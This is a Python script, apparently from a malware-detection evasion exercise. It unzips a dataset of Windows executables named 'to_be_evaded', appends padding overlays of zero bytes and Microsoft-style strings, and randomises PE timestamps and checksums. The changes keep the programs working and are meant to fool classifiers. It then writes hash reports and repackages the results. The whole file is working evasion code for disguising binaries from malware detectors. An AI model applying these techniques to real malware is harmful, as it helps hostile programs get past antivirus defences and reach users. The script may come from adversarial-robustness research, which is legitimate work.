#!/usr/bin/env python3
"""
Method 3 - safe overlay-only strategy extracted from attack2.py.

Steps handled by this script:
1. Import and unzip the encrypted dataset archive.
2. Apply one of the overlay/PE-header safe transformations.
3. Emit compare_report + sha256 lists in the output directory.
4. Re-zip everything for downstream usage.
"""

import argparse
import csv
import hashlib
import random
import shutil
import time
import zipfile
from pathlib import Path


METHOD_NAME = "method3_safe_overlay"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def strategy_simple_overlay(src: Path, dst: Path) -> bool:
    data = src.read_bytes()
    orig_size = len(data)

    benign_data = bytearray()
    benign_data.extend(b"\x00" * 600_000)
    patterns = [
        b"Microsoft Corporation\x00",
        b"Windows Operating System\x00",
        b"Copyright (C) 2024 Microsoft Corporation. All rights reserved.\x00",
        b"Visual Studio 2022\x00",
        b".text\x00\x00\x00",
        b".data\x00\x00\x00",
        b".rdata\x00\x00",
        b".rsrc\x00\x00\x00",
        b"kernel32.dll\x00",
        b"user32.dll\x00",
        b"advapi32.dll\x00",
    ]
    for _ in range(20_000):
        benign_data.extend(random.choice(patterns))

    max_append = 4_900_000 - orig_size
    target_append = random.randint(1_800_000, 2_800_000)
    append_size = min(target_append, max_append, len(benign_data))
    if append_size < 100_000:
        append_size = min(100_000, max_append)

    final_data = data + bytes(benign_data[:append_size])
    dst.write_bytes(final_data)
    final_size = len(final_data)
    print(f"      Overlay: {orig_size:,} + {append_size:,} = {final_size:,} bytes")
    return True


def strategy_pe_header_safe(src: Path, dst: Path) -> bool:
    try:
        import pefile

        data = src.read_bytes()
        dst.write_bytes(data)
        try:
            pe = pefile.PE(str(dst))
            pe.FILE_HEADER.TimeDateStamp = random.randint(0x65000000, 0x66000000)
            pe.OPTIONAL_HEADER.CheckSum = 0
            pe.write(str(dst))
            pe.close()
            print("      PE patch: timestamp and checksum updated")
        except Exception as exc:
            print(f"      PE update failed (continuing overlay): {str(exc)[:50]}")

        current_data = dst.read_bytes()
        current_size = len(current_data)
        padding = bytearray()
        padding.extend(b"\x00" * 400_000)
        patterns = [b"Windows\x00", b"Microsoft\x00", b"Copyright\x00"] * 3000
        for entry in patterns:
            padding.extend(entry)

        max_padding = 4_900_000 - current_size
        padding_size = min(1_000_000, max_padding, len(padding))
        if padding_size > 0:
            final_data = current_data + bytes(padding[:padding_size])
            dst.write_bytes(final_data)
            print(f"      + Overlay: {padding_size:,} bytes")
        return True
    except ImportError:
        print("      pefile is missing, using pure overlay")
    except Exception as exc:
        print(f"      Strategy 2 failed: {str(exc)[:50]}; falling back to pure overlay")
    return strategy_simple_overlay(src, dst)


def strategy_aggressive_overlay(src: Path, dst: Path) -> bool:
    data = src.read_bytes()
    orig_size = len(data)
    random.seed(hash(src.name))

    size_ratios = [1.3, 1.6, 1.9, 2.2, 2.5, 2.8]
    ratio = random.choice(size_ratios)
    target_size = min(int(orig_size * ratio), 4_900_000)
    append_size = target_size - orig_size
    if append_size < 100_000:
        append_size = min(1_000_000, 4_900_000 - orig_size)

    mode = random.randint(1, 3)
    if mode == 1:
        padding = b"\x00" * int(append_size * 0.8)
        padding += (b"Microsoft\x00" * 1000)[: int(append_size * 0.2)]
    elif mode == 2:
        padding = bytearray()
        strings = (
            [b"Windows\x00", b"System\x00", b"Program\x00", b"Microsoft\x00", b"Copyright\x00"]
            * 500
        )
        while len(padding) < append_size:
            padding.extend(random.choice(strings))
        padding = bytes(padding[:append_size])
    else:
        half = append_size // 2
        padding = b"\x00" * half
        pattern = (b"Windows\x00Microsoft\x00" * 2000)[: append_size - half]
        padding += pattern

    final_data = data + padding
    dst.write_bytes(final_data)
    print(f"      Aggressive overlay (mode {mode}): {orig_size:,} -> {len(final_data):,} bytes (ratio {ratio:.1f}x)")
    return True


def placeholder_transform(src: Path, dst: Path) -> bool:
    filename = src.name
    try:
        idx = int(filename.replace(".exe", "").replace(".dll", ""))
    except ValueError:
        idx = hash(filename) % 50

    if idx <= 15:
        print("      -> Strategy 1 (Pure Overlay)")
        return strategy_simple_overlay(src, dst)
    if idx <= 35:
        print("      -> Strategy 2 (PE Header + Overlay)")
        return strategy_pe_header_safe(src, dst)
    print("      -> Strategy 3 (Aggressive Overlay)")
    return strategy_aggressive_overlay(src, dst)


def process_files(input_dir: Path, output_dir: Path) -> None:
    if output_dir.exists():
        shutil.rmtree(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    files = collect_inputs(input_dir)
    rows = []
    success = 0
    fail = 0
    start_time = time.time()

    print("=" * 70)
    print("Safe overlay pipeline - behavior preserving")
    print("=" * 70)
    print(f"Input: {input_dir}")
    print(f"Output: {output_dir}")
    print(f"Files: {len(files)}")
    print("=" * 70)

    for idx, src in enumerate(files, 1):
        print(f"\n[{idx}/{len(files)}] {src.name}")
        dst = output_dir / src.name
        base_sha = sha256_of(src)
        start = time.time()
        try:
            placeholder_transform(src, dst)
            duration = time.time() - start
            out_sha = sha256_of(dst)
            final_size = dst.stat().st_size
            if final_size > 5_000_000:
                print(f"      Warning: exceeds 5MB ({final_size:,} bytes)")
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": out_sha,
                    "baseline_size": src.stat().st_size,
                    "output_size": final_size,
                    "status": "OK",
                    "duration_sec": f"{duration:.3f}",
                    "notes": "safe-overlay",
                }
            )
            success += 1
        except Exception as exc:
            duration = time.time() - start
            print(f"      Failure: {str(exc)[:100]}")
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": "",
                    "baseline_size": src.stat().st_size,
                    "output_size": 0,
                    "status": "FAIL",
                    "duration_sec": f"{duration:.3f}",
                    "notes": f"error: {str(exc)[:120]}",
                }
            )
            fail += 1

    total_time = time.time() - start_time
    csv_file = output_dir / "compare_report.csv"
    with csv_file.open("w", newline="") as handle:
        fieldnames = [
            "filename",
            "baseline_sha256",
            "output_sha256",
            "baseline_size",
            "output_size",
            "status",
            "duration_sec",
            "notes",
        ]
        writer = csv.DictWriter(handle, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)

    sha_file = output_dir / "sha256sums.txt"
    with sha_file.open("w") as handle:
        for row in rows:
            if row["status"] == "OK":
                handle.write(f'{row["output_sha256"]}  {output_dir / row["filename"]}\n')

    print("\n" + "=" * 70)
    print("Processing complete")
    print("=" * 70)
    print(f"Success: {success}/{len(files)} ({(success/len(files))*100 if files else 0:.1f}%)")
    print(f"Failure: {fail}/{len(files)}")
    print(f"Elapsed time: {total_time:.1f} seconds")
    print(f"Report: {csv_file}")
    print(f"Hashes: {sha_file}")


def run_pipeline(archive_path: Path, work_root: Path, output_zip: Path) -> None:
    input_dir = work_root / "input"
    output_dir = work_root / "output"
    extract_dataset(archive_path, input_dir)
    process_files(input_dir, output_dir)
    compress_outputs(output_dir, output_zip)
    print(f"\nPackaging complete -> {output_zip}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Run the Model1 Method3 safe overlay pipeline end-to-end."
    )
    parser.add_argument(
        "--archive",
        default=str(DEFAULT_ARCHIVE),
        help="Path to the zipped dataset.",
    )
    parser.add_argument(
        "--work-root",
        default=str(DEFAULT_WORK_ROOT),
        help="Working directory used for extraction + processing.",
    )
    parser.add_argument(
        "--output-zip",
        default=str(DEFAULT_OUTPUT_ZIP),
        help="Destination zip for processed files.",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    run_pipeline(
        Path(args.archive).expanduser().resolve(),
        Path(args.work_root).expanduser().resolve(),
        Path(args.output_zip).expanduser().resolve(),
    )


if __name__ == "__main__":
    main()
